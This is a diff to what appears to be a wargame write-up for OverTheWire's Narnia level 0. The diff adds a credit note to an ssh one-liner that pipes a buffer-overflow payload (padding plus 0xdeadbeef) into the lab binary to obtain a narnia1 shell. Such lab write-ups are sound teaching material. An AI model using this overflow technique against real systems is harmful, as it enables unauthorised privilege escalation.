@@ -46,6 +46,8 @@ Therefore, we can do a oneliner as follows to get shell
 ssh -p 2226 narnia0@narnia.labs.overthewire.org bash -c "\"(echo -e 'AAAAAAAAAAAAAAAAAAAA\xef\xbe\xad\xde' && cat) | /narnia/narnia0\""
 ```
 
+> As a sidenote, thanks to peachoolong-uwu who told me that I can embed `echo -e 'AAAAAAAAAAAAAAAAAAAA\xef\xbe\xad\xde'` inside a pair of parentheses and add `&& cat` to keep the stdin steam open.
+
 Now once we type the password of narnia0, `/narnia/narnia0` will send us to
  a sub-shell and we should be `narnia1` in this new shell.
 
